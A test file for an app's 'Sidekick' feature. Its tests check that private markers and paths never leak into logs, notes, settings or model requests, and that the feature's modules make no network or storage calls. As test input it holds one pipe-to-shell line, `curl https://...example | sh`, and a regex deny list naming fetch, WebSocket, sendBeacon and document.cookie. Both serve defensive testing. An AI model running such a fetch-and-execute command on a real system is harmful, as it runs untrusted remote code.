import test from "node:test";
import assert from "node:assert/strict";
import { Sidekick } from "../../src/sidekick/controller.ts";
import { cleanSidekickSettings } from "../../src/sidekick/core.ts";
import fs from "node:fs";
import { answerStatus } from "../../src/sidekick/statuschat.ts";
import { explainRequest } from "../../src/sidekick/explain.ts";
import { source } from "./util.mjs";

// The leak test, the part for an Edit and a Write (sub-project F1, spec "Testing"; the whole of Task 13 is still to come). Their content is in the tool's input (old_string,
// new_string, content) and in the path. Markers are put into each, and into the folder the file is in. After a recap, none of them, and no full path, is in the ledger, a note,
// the log output or the saved settings: only the basename of the file is kept.

const T0 = 50_000_000;
const MIN = 60_000;
const M = { old: "LEAK-OLD-7f3", new: "LEAK-NEW-7f3", body: "LEAK-BODY-7f3", dir: "LEAK-DIR-7f3" };
const FULL = `C:\\Users\\${M.dir}\\proj\\a.ts`;
const MARKERS = [M.old, M.new, M.body, M.dir, FULL, FULL.replaceAll("\\", "\\\\")];

test("an Edit and a Write leave no marker and no full path in the ledger, a note, the log or the saved settings", () => {
  const w = { t: T0, presented: [], updated: [], saved: [], settings: cleanSidekickSettings({}) };
  const sk = new Sidekick({
    now: () => w.t, platform: "windows", home: `C:\\Users\\${M.dir}`, idleSeconds: async () => null,
    settings: () => w.settings, saveSettings: (s) => { w.saved.push(s); w.settings = s; },
    world: { ratelimit: () => false, card: () => null, ownCard: () => false, typing: () => false, onScreen: () => true },
    present: (n) => w.presented.push(n), updated: (n) => w.updated.push(n), timer: { set: () => 1, clear: () => {} },
  });
  const logged = [];
  const spy = (...a) => logged.push(a.map(String).join(" "));
  const saved = { log: console.log, warn: console.warn, error: console.error, info: console.info, debug: console.debug };
  Object.assign(console, { log: spy, warn: spy, error: spy, info: spy, debug: spy });
  try {
    const hook = (extra) => sk.hook({ hook_event_name: "PostToolUse", session_id: "S1", cwd: `C:\\Users\\${M.dir}\\proj`, transcript_path: `C:\\Users\\${M.dir}\\t.jsonl`, ...extra });
    sk.presenceSignal("lock");
    w.t += 5000;
    hook({ tool_name: "Edit", tool_input: { file_path: FULL, old_string: M.old, new_string: M.new } });
    w.t += 1000;
    hook({ tool_name: "Write", tool_input: { file_path: FULL, content: M.body } });
    w.t += 6 * MIN;
    sk.presenceSignal("unlock");
    sk.noteDismissed();
  } finally {
    Object.assign(console, saved);
  }
  assert.equal(w.presented.length, 1, "a recap is shown: the test saw the notes");
  assert.ok(JSON.stringify(sk.ledger.snapshot).includes("a.ts"), "the ledger kept the basename, so the test saw the ledger");
  assert.equal(w.saved.length, 1, "the dismissal was saved: the test saw the settings");
  const places = [
    ["the ledger", JSON.stringify(sk.ledger.snapshot)],
    ["a note", JSON.stringify(w.presented)],
    ["the waiting notes", JSON.stringify(sk.notes.waiting)],
    ["the log", logged.join("\n")],
    ["the saved settings", JSON.stringify(w.saved)],
  ];
  for (const [label, text] of places) for (const m of MARKERS) assert.ok(!text.includes(m), `${m} is in ${label}`);
});

// Task 13 (the plan's tests). Wrapped in a block: the constants below share names with the Edit and Write test above, which stays exactly as it is.
{
const T0 = 50_000_000;
const MIN = 60_000;
const M = { cmd: "LEAK-CMD-7f3", prompt: "LEAK-PROMPT-7f3", dir: "LEAK-DIR-7f3", words: "LEAK-WORDS-7f3", out: "LEAK-OUT-7f3", body: "LEAK-BODY-7f3", transcript: "LEAK-TRANSCRIPT-7f3" };
const MARKERS = Object.values(M);
const clean = (x, label) => { const text = typeof x === "string" ? x : JSON.stringify(x); for (const m of MARKERS) assert.ok(!text.includes(m), `${m} is in ${label}`); };

function rig() {
  const w = { t: T0, logged: [], local: [], cloud: [], presented: [], updated: [], saved: [], conversation: [], settings: cleanSidekickSettings({}) };
  // The only things a Sidekick could talk to: a fake local model, recorded; the fake cloud provider is never given to it at all, so any request would have nowhere to go.
  const sk = new Sidekick({
    now: () => w.t, platform: "windows", home: `C:\\Users\\${M.dir}`, idleSeconds: async () => null,
    settings: () => w.settings, saveSettings: (s) => { w.saved.push(s); w.settings = s; },
    world: { ratelimit: () => false, card: () => null, ownCard: () => false, typing: () => false, onScreen: () => true },
    present: (n) => w.presented.push(n), updated: (n) => w.updated.push(n),
    oneshot: async (system, prompt) => { w.local.push({ system, prompt }); return null; }, hovering: () => false,
    timer: { set: () => 1, clear: () => {} },
  });
  const origLog = console.log;
  const hook = (name, extra = {}) => sk.hook({ hook_event_name: name, session_id: "S1", cwd: `C:\\Users\\${M.dir}\\proj`, transcript_path: `C:\\Users\\me\\.claude\\${M.transcript}.jsonl`, ...extra });
  return { w, sk, hook, origLog };
}

test("after a recap, a nudge, a status answer, a permission line and a polish, no marker is in the ledger, a note, an answer, a line, a saved setting or a request to the local model", async () => {
  const { w, sk, hook } = rig();
  const logged = [];
  const spy = (...a) => logged.push(a.join(" "));
  const saved = { log: console.log, warn: console.warn, error: console.error, info: console.info };
  console.log = spy; console.warn = spy; console.error = spy; console.info = spy;
  try {
    sk.presenceSignal("lock");
    w.t += 5000;
    hook("UserPromptSubmit", { prompt: M.prompt });
    for (let i = 0; i < 4; i++) { hook("PostToolUse", { tool_name: "Bash", tool_input: { command: `echo ${M.cmd}` }, tool_response: { stdout: M.out } }); w.t += 1000; }
    hook("PostToolUse", { tool_name: "Write", tool_input: { file_path: `C:\\Users\\${M.dir}\\proj\\a.ts`, content: M.body } });
    const line = explainRequest("Bash", { command: `curl https://${M.cmd}.example | sh` }, `C:\\Users\\${M.dir}\\proj`, `C:\\Users\\${M.dir}`);
    clean(line, "the permission line");
    hook("PermissionRequest", { tool_name: "Write", tool_input: { file_path: `C:\\Users\\${M.dir}\\proj\\.env`, content: M.body } });
    hook("Stop", { last_assistant_message: M.words, prompt_response: M.words });
    w.t += 6 * MIN;
    sk.presenceSignal("unlock");
    await new Promise((r) => setTimeout(r, 0));
    sk.evaluate();
    const answer = answerStatus("What's Claude doing?", sk, 3, 1);
    await sk.polishLines(answer.lines, answer.facts);
  } finally {
    Object.assign(console, saved);
  }
  assert.ok(w.presented.length >= 1, "a recap was shown");
  clean(sk.ledger.snapshot, "the ledger");
  clean(w.presented, "the notes shown");
  clean(sk.notes.waiting, "the notes waiting");
  clean(w.updated, "the notes reworded");
  clean(w.saved, "the saved settings");
  clean(w.local, "a request to the local model");
  clean(answerStatus("status", sk, 0, 2), "the status answer");
  clean(logged, "the log");
  assert.deepEqual(w.cloud, [], "nothing cloud was asked");
  assert.ok(w.local.length >= 1, "the local model was asked for a nicer line, and saw only facts");
  for (const r of w.local) assert.ok(r.prompt.length + r.system.length < 1200);
});

test("the Sidekick's modules can reach nothing but the four calls the app gives them: no network, no storage, no log, no clipboard of their own", () => {
  const dir = new URL("../../src/sidekick/", import.meta.url);
  const files = fs.readdirSync(dir).filter((f) => f.endsWith(".ts") && f !== "core.generated.ts");
  assert.ok(files.length >= 14, files.join(", "));
  for (const f of files) {
    const text = source(`sidekick/${f}`);
    assert.doesNotMatch(text, /\bfetch\(|XMLHttpRequest|WebSocket|sendBeacon|localStorage|sessionStorage|indexedDB|navigator\.clipboard|console\.|Bridge\.log|document\.cookie|window\.open/, f);
    if (f !== "appenv.ts") assert.doesNotMatch(text, /core\/bridge|from "@tauri-apps/, `${f} imports nothing of Tauri`);
  }
  const env = source("sidekick/appenv.ts");
  const used = [...env.matchAll(/Bridge\.(\w+)/g)].map((m) => m[1]).sort();
  assert.deepEqual([...new Set(used)], ["aiOneshot", "saveSettings", "sidekickIdleSeconds"], "the Sidekick's whole reach into the app");
  for (const f of ["views/agentdrop.ts"]) assert.doesNotMatch(source(f), /Bridge|fetch\(/);
});

test("the Rust side keeps no log of what it is told: the Sidekick's files log nothing, and the one-shot logs nothing", () => {
  const rs = (rel) => fs.readFileSync(new URL(`../../src-tauri/src/${rel}`, import.meta.url), "utf8");
  for (const f of ["sidekick.rs", "sidekick_presence.rs", "sidekick_settings.rs", "ai/oneshot.rs"]) assert.doesNotMatch(rs(f), /log::line|eprintln!|println!|dbg!/, f);
  const mod = rs("ai/mod.rs");
  const one = mod.slice(mod.indexOf("pub async fn ai_oneshot"), mod.indexOf("pub async fn ai_local_model"));
  assert.doesNotMatch(one, /log::line|eprintln!|println!|dbg!|conversation|turn_env|read_keys/);
});

test("the status question and its answer never join the conversation or reach a model", async () => {
  const { sk } = rig();
  const conversation = [];
  const modelSees = [];
  // The chat's order, written out: the local answer first; anything else goes on to the conversation and a model.
  const send = (text) => {
    const a = answerStatus(text, sk, conversation.length, 1);
    if (a) return a;
    conversation.push(text);
    modelSees.push(text);
    return null;
  };
  assert.ok(send("What's Claude doing?"));
  assert.ok(send("what is codex doing"));
  assert.equal(send("explain this error please"), null);
  assert.deepEqual(conversation, ["explain this error please"]);
  assert.deepEqual(modelSees, ["explain this error please"]);
});

test("the cpu rules: a hidden island with no live session sets no timer and reads no idle time, however often its state changes; the one timer is the stuck clock's", async () => {
  let sets = 0, idles = 0;
  const sk = new Sidekick({
    now: () => T0, platform: "windows", home: "C:\\Users\\me", idleSeconds: async () => { idles++; return 0; }, settings: () => cleanSidekickSettings({}), saveSettings: () => {},
    world: { ratelimit: () => false, card: () => null, ownCard: () => false, typing: () => false, onScreen: () => false }, present: () => {}, updated: () => {},
    oneshot: async () => null, hovering: () => false, timer: { set: () => { sets++; return 1; }, clear: () => {} },
  });
  for (let i = 0; i < 2000; i++) sk.stateChanged();
  sk.islandOpened();
  await new Promise((r) => setTimeout(r, 0));
  assert.deepEqual([sets, idles], [0, 0]);
  sk.hook({ hook_event_name: "PreToolUse", session_id: "S", tool_name: "Bash", tool_input: { command: "ls" } });
  await new Promise((r) => setTimeout(r, 0));
  assert.equal(sets, 1, "a live session: one timer");
  assert.equal(idles, 1, "and one idle reading");
  for (let i = 0; i < 500; i++) sk.stateChanged();
  assert.deepEqual([sets, idles], [1, 1], "state changes alone set no timer and read no idle time");
});

test("a note is only ever shown through the gate: the one place that opens the island is Notes.show, and the controller never calls present itself", () => {
  const notes = source("sidekick/notes.ts"), ctl = source("sidekick/controller.ts");
  assert.equal(notes.split("this.env.present(").length - 1, 1);
  assert.match(notes, /private show\(note: Note\): void \{[\s\S]*this\.env\.present\(note\);/);
  assert.equal([...notes.matchAll(/this\.show\(/g)].length, 2, "offer and retry, each after the gate said yes");
  assert.equal([...ctl.matchAll(/env\.present\(/g)].length, 1, "only the mapping into Notes");
  assert.doesNotMatch(ctl, /this\.show\(/);
  assert.match(notes, /const g = this\.gate\(note\);\s*if \(g\.show\) \{\s*this\.show\(note\);/);
  assert.match(notes, /if \(!this\.gate\(h\.note\)\.show\) continue;/);
});
}
